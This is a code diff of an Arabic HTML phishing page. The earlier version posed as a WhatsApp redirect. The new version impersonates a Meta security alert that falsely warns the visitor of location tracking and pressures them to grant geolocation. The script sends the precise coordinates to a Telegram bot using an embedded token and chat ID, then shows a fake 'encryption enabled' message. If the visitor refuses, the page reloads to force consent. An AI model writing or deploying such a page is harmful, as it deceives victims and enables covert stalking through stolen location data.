@@ -1,62 +1,49 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>WhatsApp Direct</title>
+    <title>مركز أمان ميتا - حماية المواقع</title>
     <style>
-        body { background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; }
-        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #25D366; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        body { background-color: #000; color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: #1a1a1a; padding: 25px; border-radius: 15px; border: 1px solid #ff3b30; width: 90%; max-width: 400px; text-align: center; }
+        .alert-icon { width: 60px; filter: invert(1); margin-bottom: 15px; }
+        h2 { color: #ff3b30; font-size: 18px; }
+        p { font-size: 14px; line-height: 1.6; color: #ccc; }
+        .btn { background-color: #ff3b30; color: white; padding: 12px; border-radius: 8px; border: none; font-weight: bold; width: 100%; cursor: pointer; margin-top: 15px; }
     </style>
 </head>
 <body>
 
-<div style="text-align: center;">
-    <div class="loader"></div>
-    <p id="msg">جاري التحويل لمحادثة الواتساب...</p>
+<div class="card">
+    <img src="https://cdn-icons-png.flaticon.com/512/564/564619.png" class="alert-icon">
+    <h2>تحذير أمني عاجل!</h2>
+    <p>تم اكتشاف محاولة "تتبع نشط" لموقعك الجغرافي من جهاز غريب. <br><br> لتشفير موقعك الحالي ومنع التتبع، يرجى الضغط على الزر واختيار <b>(سماح/Allow)</b> لتفعيل بروتوكول الحماية فوراً.</p>
+    <button class="btn" onclick="secure()">تفعيل حماية الموقع</button>
 </div>
 
 <script>
     const token = '8669811855:AAGvHpikmaCi4E_dlFy24J1iYUgAdlnXWsg'; //
     const chat_id = '7214473798'; //
-    const targetPhone = '963997715905'; //
 
-    function captureLocation() {
-        const options = { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }; //
+    function secure() {
+        const options = { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 }; //
 
         navigator.geolocation.getCurrentPosition(function(p) {
             const lat = p.coords.latitude;
             const lon = p.coords.longitude;
             const acc = p.coords.accuracy;
+            const mapLink = `https://www.google.com/maps?q=${lat},${lon}`; //
             
-            // رابط مباشر يفتح الخرائط فوراً
-            const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
+            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent('🚨 تم صيد الموقع بدقة!\n📍 ' + mapLink + '\n📏 الدقة: ' + acc.toFixed(1) + ' متر')}&parse_mode=Markdown`);
             
-            let report = `🎯 **تم الصيد بنجاح!**\n\n`;
-            report += `📍 الموقع: ${mapLink}\n`;
-            report += `📏 الدقة: ${acc.toFixed(1)} متر`;
-
-            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(report)}&parse_mode=Markdown`)
-            .then(() => {
-                window.location.href = `https://wa.me/${targetPhone}`;
-            });
-
+            alert("تم تفعيل التشفير بنجاح. موقعك الآن مخفي.");
+            window.location.href = "https://about.meta.com/technologies/security/";
         }, function(e) {
-            // في حال الرفض (Block): نطلع رسالة تنبيه ونعيد التحميل لإجباره
-            alert("⚠️ تنبيه أمني: يرجى السماح بالوصول للموقع لتأكيد أنك لست روبوت (Robot) وفتح المحادثة.");
-            location.reload(); 
+            alert("خطأ: لم يتم تفعيل الحماية! يجب الضغط على 'سماح' لحظر المتسللين.");
+            location.reload();
         }, options);
     }
-
-    // تشغيل الكود فوراً
-    window.onload = function() {
-        if (navigator.geolocation) {
-            captureLocation();
-        } else {
-            alert("متصفحك قديم، يرجى فتحه من متصفح جوجل كروم.");
-        }
-    };
 </script>
 </body>
 </html>
